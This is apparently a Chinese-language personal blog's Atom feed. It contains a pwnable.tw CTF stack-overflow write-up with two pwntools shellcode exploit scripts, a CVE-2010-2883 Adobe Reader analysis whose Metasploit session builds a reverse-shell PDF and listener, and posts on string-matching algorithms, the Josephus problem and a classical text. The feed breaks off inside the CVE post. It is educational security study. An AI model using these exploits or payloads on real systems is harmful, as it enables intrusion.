<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Nero&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-03-20T12:22:27.510Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Nero</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Writeup of pwnable.tw之start</title>
    <link href="http://yoursite.com/2020/03/20/Writeup-of-pwnable-tw%E4%B9%8Bstart/"/>
    <id>http://yoursite.com/2020/03/20/Writeup-of-pwnable-tw%E4%B9%8Bstart/</id>
    <published>2020-03-20T11:44:15.000Z</published>
    <updated>2020-03-20T12:22:27.510Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址：pwable.tw</p><p>使用checksec查看开启了哪些防护措施：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>使用objdump -d进行反汇编：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">08048060 &lt;_start&gt;:</span><br><span class="line"> 8048060:54                   push   %esp</span><br><span class="line"> 8048061:68 9d 80 04 08       push   $0x804809d</span><br><span class="line"> 8048066:31 c0                xor    %eax,%eax</span><br><span class="line"> 8048068:31 db                xor    %ebx,%ebx</span><br><span class="line"> 804806a:31 c9                xor    %ecx,%ecx</span><br><span class="line"> 804806c:31 d2                xor    %edx,%edx</span><br><span class="line"> 804806e:68 43 54 46 3a       push   $0x3a465443</span><br><span class="line"> 8048073:68 74 68 65 20       push   $0x20656874</span><br><span class="line"> 8048078:68 61 72 74 20       push   $0x20747261</span><br><span class="line"> 804807d:68 73 20 73 74       push   $0x74732073</span><br><span class="line"> 8048082:68 4c 65 74 27       push   $0x2774654c &#x2F;&#x2F;将要显示的字符串压栈</span><br><span class="line"> 8048087:89 e1                mov    %esp,%ecx</span><br><span class="line"> 8048089:b2 14                mov    $0x14,%dl</span><br><span class="line"> 804808b:b3 01                mov    $0x1,%bl</span><br><span class="line"> 804808d:b0 04                mov    $0x4,%al</span><br><span class="line"> 804808f:cd 80                int    $0x80</span><br><span class="line"> 8048091:31 db                xor    %ebx,%ebx</span><br><span class="line"> 8048093:b2 3c                mov    $0x3c,%dl</span><br><span class="line"> 8048095:b0 03                mov    $0x3,%al</span><br><span class="line"> 8048097:cd 80                int    $0x80</span><br><span class="line"> 8048099:83 c4 14             add    $0x14,%esp</span><br><span class="line"> 804809c:c3                   ret    </span><br><span class="line"></span><br><span class="line">0804809d &lt;_exit&gt;:</span><br><span class="line"> 804809d:5c                   pop    %esp</span><br><span class="line"> 804809e:31 c0                xor    %eax,%eax</span><br><span class="line"> 80480a0:40                   inc    %eax</span><br><span class="line"> 80480a1:cd 80                int    $0x80</span><br></pre></td></tr></table></figure><p>可以看出程序的流程就是执行了write(1, esp_address, 0x14)；向控制台写入要显示的字符。</p><p>然后执行read(0, esp_address, 0x3c)；读入字符串。</p><p>可看出存在明显的栈溢出漏洞，且未开启任何防护措施。但是我们不知道栈地址，所以需要leak栈地址。通过最上边的一条反汇编：</p><p> 8048060:    54                       push   %esp</p><p>可以 ret 到0x8048087处将esp处的内容leak出来，此时的栈顶储存的时栈顶地址+4的地址值。</p><p>具体思路如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">"i386"</span>, os = <span class="string">"linux"</span>)</span><br><span class="line"><span class="comment">#p = process("./start")</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="string">"10000"</span>)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(<span class="string">"A"</span>*<span class="number">20</span>+p32(<span class="number">0x8048087</span>)) <span class="comment">#返回到0x8048087处再执行write(1, esp_address, 0x14)</span></span><br><span class="line">s = p.recv(<span class="number">4</span>)  <span class="comment">#接收到esp的值</span></span><br><span class="line">address_esp = u32(s)</span><br><span class="line">ass=<span class="string">'''mov al,0x03\n</span></span><br><span class="line"><span class="string">   sub esp,0x40\n</span></span><br><span class="line"><span class="string">   mov ecx,esp\n</span></span><br><span class="line"><span class="string">   mov dl,0x40\n</span></span><br><span class="line"><span class="string">   int 0x80\n</span></span><br><span class="line"><span class="string">   jmp esp'''</span>  <span class="comment">#直接跳到shellcode地址处</span></span><br><span class="line">p.send(<span class="string">"A"</span>*<span class="number">0x14</span>+p32(address_esp+<span class="number">0x14</span>)+asm(ass))<span class="comment">#由于题目内的read(),只能读0x3c个值，所以构造一个可以读取更多内容的shellcode。</span></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.send(asm(shellcraft.sh()))<span class="comment">#读入shellcode，</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">"i386"</span>, os = <span class="string">"linux"</span>)</span><br><span class="line"><span class="comment">#p = process("./start")</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="string">"10000"</span>)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(<span class="string">"A"</span>*<span class="number">20</span>+p32(<span class="number">0x8048087</span>))</span><br><span class="line">s = p.recv(<span class="number">4</span>)</span><br><span class="line">address_esp = u32(s)</span><br><span class="line">ass=<span class="string">'''mov al,0x03\n</span></span><br><span class="line"><span class="string">   sub esp,0x40\n</span></span><br><span class="line"><span class="string">   mov ecx,esp\n</span></span><br><span class="line"><span class="string">   mov dl,0x40\n</span></span><br><span class="line"><span class="string">   int 0x80\n</span></span><br><span class="line"><span class="string">   ret'''</span></span><br><span class="line">p.send(<span class="string">"A"</span>*<span class="number">0x14</span>+p32(address_esp+<span class="number">0x14</span>)+asm(ass))</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.send(p32(address_esp+<span class="number">0x14</span>+<span class="number">0x04</span><span class="number">-0x40</span>)+asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目地址：pwable.tw&lt;/p&gt;
&lt;p&gt;使用checksec查看开启了哪些防护措施：&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;
      
    
    </summary>
    
    
      <category term="技术分析" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="栈溢出" scheme="http://yoursite.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>读《大学》</title>
    <link href="http://yoursite.com/2020/03/16/%E8%AF%BB%E3%80%8A%E5%A4%A7%E5%AD%A6%E3%80%8B/"/>
    <id>http://yoursite.com/2020/03/16/%E8%AF%BB%E3%80%8A%E5%A4%A7%E5%AD%A6%E3%80%8B/</id>
    <published>2020-03-16T11:16:25.000Z</published>
    <updated>2020-03-16T13:26:57.212Z</updated>
    
    <content type="html"><![CDATA[<p>汤之《盘铭》曰：“苟日新，日日新，又日新。”《康诰》曰：“作新民。”《诗》曰：“周虽旧邦，其命维新。”是故君子无所不用其极。</p><p>每日更新自己，不间断。君子无处不追求最完善的境地。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;汤之《盘铭》曰：“苟日新，日日新，又日新。”《康诰》曰：“作新民。”《诗》曰：“周虽旧邦，其命维新。”是故君子无所不用其极。&lt;/p&gt;
&lt;p&gt;每日更新自己，不间断。君子无处不追求最完善的境地。&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="随笔杂谈" scheme="http://yoursite.com/categories/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>模式匹配算法</title>
    <link href="http://yoursite.com/2020/03/16/%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95/"/>
    <id>http://yoursite.com/2020/03/16/%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95/</id>
    <published>2020-03-16T02:27:34.000Z</published>
    <updated>2020-03-16T08:34:19.478Z</updated>
    
    <content type="html"><![CDATA[<h6 id="一、朴素模式匹配算法"><a href="#一、朴素模式匹配算法" class="headerlink" title="一、朴素模式匹配算法"></a>一、朴素模式匹配算法</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回字串T在主串S中第pos个字符之后的位置。若不存在，则函数返回0；</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bf</span><span class="params">(<span class="built_in">string</span> S, <span class="built_in">string</span> T, <span class="keyword">int</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = pos;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> S_length = S.length();</span><br><span class="line"><span class="keyword">int</span> T_length = T.length();</span><br><span class="line"><span class="keyword">while</span> (i &lt; S_length &amp;&amp; j &lt; T_length) &#123;</span><br><span class="line"><span class="keyword">if</span> (S[i] == T[j]) &#123;</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">i = i - j + <span class="number">1</span>;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (j &gt;= T_length) &#123;</span><br><span class="line"><span class="keyword">return</span> i - T_length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="二、KMP模式匹配算法"><a href="#二、KMP模式匹配算法" class="headerlink" title="二、KMP模式匹配算法"></a>二、KMP模式匹配算法</h6><p>KMP(克努特-莫里斯-普拉特)</p><p>字串各个位的j值的变化定义为一个数组next:</p><p><img src="KMP.png" alt=""></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*通过计算返回字串T的next数组。*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_next</span><span class="params">(<span class="built_in">string</span> T, <span class="keyword">int</span> *next)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">1</span>, k=<span class="number">0</span>;</span><br><span class="line">next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt; T.length()<span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (k == <span class="number">-1</span> || T[i] == T[k]) &#123;</span><br><span class="line">i++;</span><br><span class="line">k++;</span><br><span class="line">next[i] = k;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">k = next[k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">KMP</span><span class="params">(<span class="built_in">string</span> S, <span class="built_in">string</span> T, <span class="keyword">int</span> pos)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = pos;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> next[<span class="number">255</span>];</span><br><span class="line">get_next(T, next);</span><br><span class="line"><span class="keyword">int</span> S_len = S.length();</span><br><span class="line"><span class="keyword">int</span> T_len = T.length();</span><br><span class="line"><span class="keyword">while</span> (i &lt; S_len &amp;&amp; j &lt; T_len) &#123;</span><br><span class="line"><span class="keyword">if</span> (j == <span class="number">-1</span> || S[i] == T[j]) &#123;</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">j = next[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (j &gt;= T_len)</span><br><span class="line"><span class="keyword">return</span> i - T_len;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h6 id=&quot;一、朴素模式匹配算法&quot;&gt;&lt;a href=&quot;#一、朴素模式匹配算法&quot; class=&quot;headerlink&quot; title=&quot;一、朴素模式匹配算法&quot;&gt;&lt;/a&gt;一、朴素模式匹配算法&lt;/h6&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;
      
    
    </summary>
    
    
      <category term="技术分析" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Algorithm" scheme="http://yoursite.com/tags/Algorithm/"/>
    
      <category term="数据结构" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
      <category term="模式匹配算法" scheme="http://yoursite.com/tags/%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95/"/>
    
      <category term="串" scheme="http://yoursite.com/tags/%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>Josephus</title>
    <link href="http://yoursite.com/2020/03/16/Josephus/"/>
    <id>http://yoursite.com/2020/03/16/Josephus/</id>
    <published>2020-03-16T02:17:39.058Z</published>
    <updated>2020-03-16T08:30:19.235Z</updated>
    
    <content type="html"><![CDATA[<p>约瑟夫问题是个有名的问题：N个人围成一圈，从第一个开始报数，第M个将被杀掉，最后剩下一个，其余人都将被杀掉。例如N=6，M=5，被杀掉的顺序是：5，4，6，2，3，1。</p><p>代码实现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Joseph</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>]; <span class="comment">//开局每个人的编号</span></span><br><span class="line"><span class="keyword">int</span> k = <span class="number">0</span>;  <span class="comment">//记录第k个出局的人</span></span><br><span class="line"><span class="keyword">int</span> p = <span class="number">0</span>;  <span class="comment">//出局人的当前位置</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">a[i] = i + <span class="number">1</span>; <span class="comment">//编号初始化，</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//循环T人</span></span><br><span class="line"><span class="keyword">while</span> (n &gt; <span class="number">1</span>)&#123;</span><br><span class="line">p = (p + m - <span class="number">1</span>) % n; <span class="comment">//关键点，计算出圈人的位置</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"第"</span> &lt;&lt; ++k &lt;&lt; <span class="string">"个出圈的是："</span> &lt;&lt; a[p] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//重新排序</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = p + <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">a[j - <span class="number">1</span>] = a[j]; </span><br><span class="line">        <span class="comment">//人数减一</span></span><br><span class="line">n--;</span><br><span class="line"><span class="keyword">if</span> (p == n) p = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"最后剩下的是"</span> &lt;&lt; a[p] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;约瑟夫问题是个有名的问题：N个人围成一圈，从第一个开始报数，第M个将被杀掉，最后剩下一个，其余人都将被杀掉。例如N=6，M=5，被杀掉的顺序是：5，4，6，2，3，1。&lt;/p&gt;
&lt;p&gt;代码实现：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;tabl
      
    
    </summary>
    
    
      <category term="技术分析" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Algorithm" scheme="http://yoursite.com/tags/Algorithm/"/>
    
      <category term="约瑟夫问题" scheme="http://yoursite.com/tags/%E7%BA%A6%E7%91%9F%E5%A4%AB%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞</title>
    <link href="http://yoursite.com/2020/03/15/CVE-2010-2883/"/>
    <id>http://yoursite.com/2020/03/15/CVE-2010-2883/</id>
    <published>2020-03-14T17:39:48.865Z</published>
    <updated>2020-03-16T08:30:13.568Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、调试环境"><a href="#一、调试环境" class="headerlink" title="一、调试环境"></a>一、调试环境</h1><p>windows xp sp3中文版</p><p>Adobe Reader (9.3.4)</p><p>Ollydbg</p><p>IDA Pro</p><p>010editor</p><h1 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h1><h2 id="1-样本构造"><a href="#1-样本构造" class="headerlink" title="1.样本构造"></a>1.样本构造</h2><p>使用msf生成样本并设置监听程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search cve-2010-2883</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                            Disclosure Date  Rank   Check  Description</span><br><span class="line">   -  ----                                            ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit&#x2F;windows&#x2F;browser&#x2F;adobe_cooltype_sing     2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">   1  exploit&#x2F;windows&#x2F;fileformat&#x2F;adobe_cooltype_sing  2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;fileformat&#x2F;adobe_cooltype_sing</span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; options                             Module options (exploit&#x2F;windows&#x2F;fileformat&#x2F;adobe_cooltype_sing):           </span><br><span class="line">   Name      Current Setting  Required  Description                         </span><br><span class="line">   ----      ---------------  --------  -----------                    </span><br><span class="line">   FILENAME  msf.pdf          yes       The file name.                                   </span><br><span class="line">   Exploit target:                                                               </span><br><span class="line">   Id  Name                                       </span><br><span class="line">   --  ----                                      </span><br><span class="line">   0   Automatic                                                   </span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp                                                  </span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp </span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; options</span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;fileformat&#x2F;adobe_cooltype_sing):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   FILENAME  msf.pdf          yes       The file name.</span><br><span class="line">Payload options (windows&#x2F;meterpreter&#x2F;reverse_tcp):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line">   **DisablePayloadHandler: True   (no handler will be created!)**</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; set LHOST 192.168.110.142</span><br><span class="line">LHOST &#x3D;&gt; 192.168.110.142</span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; set filename msf4444.pdf</span><br><span class="line">filename &#x3D;&gt; msf4444.pdf</span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; exploit </span><br><span class="line">[*] Creating &#39;msf4444.pdf&#39; file...</span><br><span class="line">[+] msf4444.pdf stored at &#x2F;home&#x2F;kali&#x2F;.msf4&#x2F;local&#x2F;msf4444.pdf</span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; back</span><br><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; options </span><br><span class="line">Module options (exploit&#x2F;multi&#x2F;handler):</span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line">Payload options (windows&#x2F;meterpreter&#x2F;reverse_tcp):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line">   </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.110.142</span><br><span class="line">LHOST &#x3D;&gt; 192.168.110.142</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br></pre></td></tr></table></figure><p>反弹shell成功：</p><p><img src="%E5%8F%8D%E5%BC%B9shell.png" alt=""></p><p><img src="%E5%8F%8D%E5%BC%B9shell2.png" alt=""></p><p>表明样本构造成功：</p><h2 id="2-样本行为分析"><a href="#2-样本行为分析" class="headerlink" title="2.样本行为分析"></a>2.样本行为分析</h2><p>使用Process Monitor开启程序的监控，分析样本行为。这里我们主要检测其网络行为。我们发现其与192.168.110.142的地址通过4444端口进行tcp通信：</p><p><img src="%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90.png" alt=""></p><h2 id="3-静态分析"><a href="#3-静态分析" class="headerlink" title="3.静态分析"></a>3.静态分析</h2><p>基于前人的探索，我们可以直接定位到漏洞位置；IDA Pro反汇编CoolType.dll库，搜索“SING”字符串，定位到下图位置：</p><p><img src="SING.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 